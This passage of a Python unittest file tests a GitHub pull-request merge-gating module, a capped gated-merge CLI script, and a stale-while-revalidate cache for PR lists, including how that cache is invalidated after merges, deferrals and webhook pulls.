            "statusCheckRollup": [{"name": "ci", "conclusion": "SUCCESS",
                                   "status": "COMPLETED"}]}
    view.update(over)
    return view


class GatedMergeTest(unittest.TestCase):
    """Single-sourced merge gates (#867)."""

    def test_strict_all_pass(self):
        ok, fails, facts = pr_gates.evaluate_merge_gates(
            _gate_view(), allowed_bases=["main"], require_approval=True,
            allow_behind=True)
        self.assertTrue(ok)
        self.assertEqual(fails, [])
        self.assertEqual(facts["ci"], "passing")

    def test_strict_each_gate_blocks(self):
        base = {"allowed_bases": ["main"], "require_approval": True,
                "allow_behind": True}
        cases = [
            ({"reviewDecision": "REVIEW_REQUIRED"}, "review"),
            ({"reviewDecision": "CHANGES_REQUESTED"}, "review"),
            ({"reviewDecision": ""}, "review"),
            ({"reviewDecision": None}, "review"),
            ({"statusCheckRollup": [
                {"conclusion": "FAILURE", "status": "COMPLETED"}]},
             "ci"),
            ({"statusCheckRollup": [
                {"conclusion": "", "status": "IN_PROGRESS"}]},
             "ci"),
            ({"statusCheckRollup": []}, "ci"),
            ({"mergeStateStatus": "DIRTY"}, "merge"),
            ({"mergeStateStatus": "BLOCKED"}, "merge"),
            ({"mergeStateStatus": None}, "merge"),
            ({"baseRefName": "feature-x"}, "base"),
        ]
        for over, gate in cases:
            ok, fails, _ = pr_gates.evaluate_merge_gates(
                _gate_view(**over), **base)
            self.assertFalse(ok, over)
            self.assertEqual([g for g, _, _ in fails], [gate], over)

    def test_strict_allows_behind(self):
        ok, fails, _ = pr_gates.evaluate_merge_gates(
            _gate_view(mergeStateStatus="BEHIND"),
            allowed_bases=["main"], require_approval=True,
            allow_behind=True)
        self.assertTrue(ok, fails)

    def test_manual_mode_preserves_legacy_semantics(self):
        # Blank decision passes (fail-open, #848); vetoes fail.
        ok, _, _ = pr_gates.evaluate_merge_gates(
            _gate_view(reviewDecision=""))
        self.assertTrue(ok)
        ok, fails, _ = pr_gates.evaluate_merge_gates(
            _gate_view(reviewDecision="REVIEW_REQUIRED"))
        self.assertFalse(ok)
        self.assertEqual([g for g, _, _ in fails], ["review"])
        ok, fails, _ = pr_gates.evaluate_merge_gates(
            _gate_view(reviewDecision="CHANGES_REQUESTED"))
        self.assertFalse(ok)
        self.assertEqual([g for g, _, _ in fails], ["review"])
        # Manual mode has no base gate and no behind.
        ok, _, _ = pr_gates.evaluate_merge_gates(
            _gate_view(baseRefName="feature-x"))
        self.assertTrue(ok)
        ok, fails, _ = pr_gates.evaluate_merge_gates(
            _gate_view(mergeStateStatus="BEHIND"))
        self.assertFalse(ok)
        self.assertEqual([g for g, _, _ in fails], ["merge"])

    def test_merge_argv_shape(self):
        self.assertEqual(
            pr_gates.merge_argv("arii/remote-server", 7),
            ["pr", "merge", "7", "--repo", "arii/remote-server",
             "--squash", "--delete-branch"])

    def test_default_branch(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=json.dumps(
                {"default_branch": "leader"})))
        self.assertEqual(
            pr_gates.default_branch("arii/hrm", runner=runner),
            "leader")
        self.assertEqual(
            runner.calls, [["gh", "api", "repos/arii/hrm"]])

    def test_open_prs_oldest_first(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=json.dumps(
                [{"number": 9}, {"number": 3}, {"number": 5}])))
        prs = pr_gates.open_prs("arii/remote-server", runner=runner)
        self.assertEqual([p["number"] for p in prs], [3, 5, 9])
        self.assertIn("--repo", runner.calls[0])
        self.assertIn("arii/remote-server", runner.calls[0])

    def test_pr_gate_view_fields(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=json.dumps({"number": 7})))
        pr_gates.pr_gate_view("arii/remote-server", 7, runner=runner)
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "view", "7", "--repo", "arii/remote-server",
              "--json", pr_gates.GATE_VIEW_FIELDS]])

    def test_merge_pr_uses_shared_argv(self):
        runner = FakeRunner().on(["gh"], FakeProc(stdout="merged"))
        out = pr_gates.merge_pr("arii/remote-server", 7, runner=runner)
        self.assertEqual(out, "merged")
        self.assertEqual(runner.calls[0][0], "gh")
        self.assertEqual(
            runner.calls[0][1:],
            pr_gates.merge_argv("arii/remote-server", 7))


class MergeGatedScriptTest(unittest.TestCase):
    """core_cli/merge_gated.py: cap, reasons, exit codes (#867)."""

    def _run_main(self, argv, fakes):
        import io
        import sys

        import core_cli.merge_gated as script

        saved = {}
        for name, fake in fakes.items():
            saved[name] = getattr(script, name)
            setattr(script, name, fake)
        out, err = io.StringIO(), io.StringIO()
        old_out, old_err = sys.stdout, sys.stderr
        sys.stdout, sys.stderr = out, err
        try:
            code = script.main(argv)
        finally:
            sys.stdout, sys.stderr = old_out, old_err
            for name, orig in saved.items():
                setattr(script, name, orig)
        return code, out.getvalue(), err.getvalue()

    def _fakes(self, prs, views, merged):
        def _default_branch(gh, runner=None):
            return "main"

        def _open_prs(gh, limit=50, runner=None):
            return prs

        def _view(gh, number, runner=None):
            return views[number]

        def _merge(gh, number, runner=None):
            merged.append(number)
            return "merged"
        return {"default_branch": _default_branch,
                "open_prs": _open_prs, "pr_gate_view": _view,
                "merge_pr": _merge}

    def test_cap_and_oldest_first(self):
        prs = [{"number": n} for n in (9, 3, 5, 1, 8, 2, 7)]
        views = {p["number"]: _gate_view() for p in prs}
        merged = []
        code, out, _ = self._run_main(
            ["merge_gated.py", "--repo", "remote-server",
             "--gh", "arii/remote-server"],
            self._fakes(prs, views, merged))
        self.assertEqual(code, 0)
        self.assertEqual(merged, [1, 2, 3, 5, 7])
        self.assertIn("cap reached (5 merges)", out)
        self.assertIn("merged=5", out)

    def test_skips_print_reasons(self):
        prs = [{"number": 1}, {"number": 2}]
        views = {1: _gate_view(reviewDecision="REVIEW_REQUIRED"),
                 2: _gate_view(mergeStateStatus="DIRTY")}
        merged = []
        code, out, _ = self._run_main(
            ["merge_gated.py", "--repo", "r",
             "--gh", "arii/remote-server"],
            self._fakes(prs, views, merged))
        self.assertEqual(code, 0)
        self.assertEqual(merged, [])
        self.assertIn("PR #1: skipped (review is REVIEW_REQUIRED", out)
        self.assertIn("PR #2: skipped (merge is dirty", out)
        self.assertIn("merged=0 skipped=2", out)

    def test_no_prs_and_bad_argv(self):
        merged = []
        code, out, _ = self._run_main(
            ["merge_gated.py", "--repo", "r",
             "--gh", "arii/remote-server"],
            self._fakes([], {}, merged))
        self.assertEqual(code, 0)
        self.assertIn("no open PRs", out)
        code, _, err = self._run_main(["merge_gated.py"], {})
        self.assertEqual(code, 2)
        self.assertIn("usage:", err)
        code, _, err = self._run_main(
            ["merge_gated.py", "--repo", "r", "--gh", "noslash"], {})
        self.assertEqual(code, 2)
        self.assertIn("bad gh path", err)

    def test_infra_failure_exits_1(self):
        def _boom(gh, runner=None):
            raise RuntimeError("gh auth failed")

        code, _, err = self._run_main(
            ["merge_gated.py", "--repo", "r",
             "--gh", "arii/remote-server"],
            {"default_branch": _boom})
        self.assertEqual(code, 1)
        self.assertIn("merged nothing", err)


class PrsCacheTest(unittest.TestCase):
    """SWR cache for the PR list (#888): TTL hits, stale revalidate,
    mutation invalidation, per-repo isolation."""

    def setUp(self):
        pulls_mod._PRS_CACHE.clear()

    def tearDown(self):
        pulls_mod._PRS_CACHE.clear()

    def _payload(self, number=7, title="Fix thing"):
        return [{
            "number": number, "title": title, "isDraft": False,
            "mergeable": "MERGEABLE", "reviewDecision": "APPROVED",
            "headRefName": "fix-thing",
            "statusCheckRollup": [
                {"name": "ci", "conclusion": "SUCCESS",
                 "status": "COMPLETED"}
            ],
            "url": f"https://github.com/arii/x/pull/{number}",
            "author": {"login": "octo"},
        }]

    def _read(self, repo="remote-server"):
        return pulls_mod.prs(repo=repo)

    def _age_entry(self, key, age):
        _, data = pulls_mod._PRS_CACHE._entries[key]
        aged = time.time() - age
        pulls_mod._PRS_CACHE._entries[key] = (aged, data)
        return aged

    def test_second_read_serves_cached_without_gh(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()) as m, \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            first = self._read()
            self.assertFalse(first["cached"])
            self.assertFalse(first["stale"])
            self.assertGreater(first["generated_at"], 0)
            self.assertNotIn(
                "cached", pulls_mod._PRS_CACHE.peek("remote-server"))
            start = time.monotonic()
            second = self._read()
            elapsed = time.monotonic() - start
            self.assertTrue(second["cached"])
            self.assertFalse(second["stale"])
            self.assertEqual(second["generated_at"],
                             first["generated_at"])
            self.assertEqual(m.call_count, 1)
            self.assertLess(elapsed, 0.2)
            self.assertEqual(second["prs"], first["prs"])
            # Markers are additive: the model accepts the payload.
            pulls_mod.PrList(**second)

    def test_stale_revalidates_and_refreshes_entry(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()) as m, \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            first = self._read()
            aged = self._age_entry("remote-server",
                                   pulls_mod.PRS_CACHE_TTL + 1)
            m.return_value = self._payload(title="Fix thing v2")
            with patch("backend.api.cache._spawn_daemon",
                       side_effect=lambda t, a: t(*a)):
                body = self._read()
            self.assertTrue(body["cached"])
            self.assertTrue(body["stale"])
            self.assertEqual(body["generated_at"], aged)
            self.assertEqual(body["prs"], first["prs"])
            # The inline refresh stored the fresh rows and cleared
            # the in-flight flag.
            ts, stored = pulls_mod._PRS_CACHE._entries[
                "remote-server"]
            self.assertGreater(ts, aged)
            self.assertEqual(stored["prs"][0]["title"],
                             "Fix thing v2")
            self.assertEqual(
                pulls_mod._PRS_CACHE._refreshing, set())
            self.assertEqual(m.call_count, 2)

    def test_past_max_stale_recomputes_synchronously(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()) as m, \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            self._read()
            self._age_entry("remote-server",
                            pulls_mod.PRS_CACHE_MAX_STALE + 1)
            m.return_value = self._payload(title="Fresh rows")
            body = self._read()
            self.assertFalse(body["cached"])
            self.assertFalse(body["stale"])
            self.assertEqual(body["prs"][0]["title"], "Fresh rows")

    def test_refresh_failure_keeps_stale(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()) as m, \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            first = self._read()
            aged = self._age_entry("remote-server",
                                   pulls_mod.PRS_CACHE_TTL + 1)
            m.side_effect = RuntimeError("gh down")
            with patch("backend.api.cache._spawn_daemon",
                       side_effect=lambda t, a: t(*a)):
                body = self._read()
            self.assertTrue(body["cached"])
            self.assertTrue(body["stale"])
            self.assertEqual(body["prs"], first["prs"])
            ts, _ = pulls_mod._PRS_CACHE._entries["remote-server"]
            self.assertEqual(ts, aged)
            self.assertEqual(
                pulls_mod._PRS_CACHE._refreshing, set())

    def test_gh_failure_on_cold_read_is_500_and_uncached(self):
        from fastapi import HTTPException

        with patch.object(pulls_mod, "run_gh_json",
                          side_effect=RuntimeError("gh down")), \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            with self.assertRaises(HTTPException) as ctx:
                self._read()
            self.assertEqual(ctx.exception.status_code, 500)
            self.assertIsNone(
                pulls_mod._PRS_CACHE.peek("remote-server"))

    def test_per_repo_isolation(self):
        def payload_for(gh, *args, **kwargs):
            if gh == "arii/boomtick":
                return self._payload(number=9, title="Boomtick PR")
            return self._payload(number=7, title="Server PR")

        with patch.object(pulls_mod, "run_gh_json",
                          side_effect=payload_for), \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            a = self._read("remote-server")
            b = self._read("boomtick")
            self.assertEqual(a["prs"][0]["title"], "Server PR")
            self.assertEqual(b["prs"][0]["title"], "Boomtick PR")
            # A repeat remote-server read serves its own entry —
            # never boomtick rows.
            a2 = self._read("remote-server")
            self.assertTrue(a2["cached"])
            self.assertEqual(a2["prs"][0]["title"], "Server PR")

    def test_runner_seam_bypasses_cache(self):
        runner = FakeRunner().on(
            ["gh", "pr", "list"], FakeProc(stdout=gh_list_prs())).on(
            ["gh", "api", "user"], FakeProc(stdout="octo"))
        first = pulls_mod.prs(repo="remote-server", runner=runner)
        second = pulls_mod.prs(repo="remote-server", runner=runner)
        self.assertFalse(first["cached"])
        self.assertFalse(second["cached"])
        self.assertGreater(second["generated_at"], 0)
        # Every runner call fans out (two list calls, no hits), and
        # nothing is stored.
        lists = [c for c in runner.calls if c[:3] == ["gh", "pr",
                                                      "list"]]
        self.assertEqual(len(lists), 2)
        self.assertIsNone(pulls_mod._PRS_CACHE.peek("remote-server"))

    def test_invalidate_helpers(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()), \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            self._read("remote-server")
            self._read("boomtick")
            pulls_mod.invalidate_prs_cache("arii/remote-server")
            self.assertIsNone(
                pulls_mod._PRS_CACHE.peek("remote-server"))
            self.assertIsNotNone(
                pulls_mod._PRS_CACHE.peek("boomtick"))
            pulls_mod.invalidate_prs_cache(None)
            self.assertIsNone(pulls_mod._PRS_CACHE.peek("boomtick"))
            # Unknown keys and blanks are a silent no-op.
            pulls_mod.invalidate_prs_cache("nope")
            pulls_mod.invalidate_prs_cache("  ")

    def test_pr_action_invalidates_prs(self):
        with patch.object(pulls_mod, "run_gh_json",
                          return_value=self._payload()) as m, \
                patch.object(pulls_mod, "_gh_viewer",
                             return_value="octo"):
            self._read()
            self.assertIsNotNone(
                pulls_mod._PRS_CACHE.peek("remote-server"))
            with patch.object(
                    pulls_mod, "_pr_action",
                    return_value={"ok": True,
                                  "output": "merged"}):
                pulls_mod.pr_action(pulls_mod.PrActionRequest(
                    repo="remote-server", pr_number=7,
                    action="merge", intent="pr-merge",
                    confirmed=True))
            self.assertIsNone(
                pulls_mod._PRS_CACHE.peek("remote-server"))
            body = self._read()
            self.assertFalse(body["cached"])
            self.assertEqual(m.call_count, 2)

    def test_defer_bulk_and_restore_invalidate_prs(self):
        from backend.api.routers import deferred as deferred_mod
        from backend.api.routers.deferred import (
            DeferredBulkRequest,
            DeferredBulkRow,
            DeferredRequest,
        )

        tmp = tempfile.mkdtemp()
        old = os.environ.get("BUTTONS_DEFERRED_PATH")
        os.environ["BUTTONS_DEFERRED_PATH"] = os.path.join(
            tmp, "deferred.json")
        try:
            with patch.object(pulls_mod, "run_gh_json",
                              return_value=self._payload()), \
                    patch.object(pulls_mod, "_gh_viewer",
                                 return_value="octo"):
                self._read()
                deferred_mod.defer_row(DeferredRequest(
                    repo="remote-server", kind="pr", number=7))
                self.assertIsNone(
                    pulls_mod._PRS_CACHE.peek("remote-server"))
                self._read()
                deferred_mod.bulk_defer_restore(
                    DeferredBulkRequest(
                        repo="remote-server", op="defer",
                        rows=[DeferredBulkRow(kind="pr",
                                              number=9)]))
                self.assertIsNone(
                    pulls_mod._PRS_CACHE.peek("remote-server"))
                self._read()
                deferred_mod.restore_row(DeferredRequest(
                    repo="remote-server", kind="pr", number=7))
                self.assertIsNone(
                    pulls_mod._PRS_CACHE.peek("remote-server"))
        finally:
            if old is None:
                os.environ.pop("BUTTONS_DEFERRED_PATH", None)
            else:
                os.environ["BUTTONS_DEFERRED_PATH"] = old

    def test_webhook_pull_invalidates_on_success_only(self):
        from backend import notify as N

        repo = "arii/remote-server"
        orig_pull, orig_append = N.webhook_pull, N.ledger.append
        N.ledger.append = lambda row: None
        try:
            with patch.object(pulls_mod, "run_gh_json",
                              return_value=self._payload()), \
                    patch.object(pulls_mod, "_gh_viewer",
                                 return_value="octo"):
                self._read()
                N.webhook_pull = lambda path: (
                    True, "up to date", False, None)
                N.webhook_worker(repo, "/tmp")
                self.assertIsNone(
                    pulls_mod._PRS_CACHE.peek("remote-server"))
                self._read()
                N.webhook_pull = lambda path: (
                    False, "boom", False, None)
                N.webhook_worker(repo, "/tmp")
                self.assertIsNotNone(
                    pulls_mod._PRS_CACHE.peek("remote-server"))
        finally:
            N.webhook_pull = orig_pull
            N.ledger.append = orig_append
            N.webhook_state.pop(repo, None)
            N.webhook_pending.discard(repo)


if __name__ == "__main__":
    unittest.main()
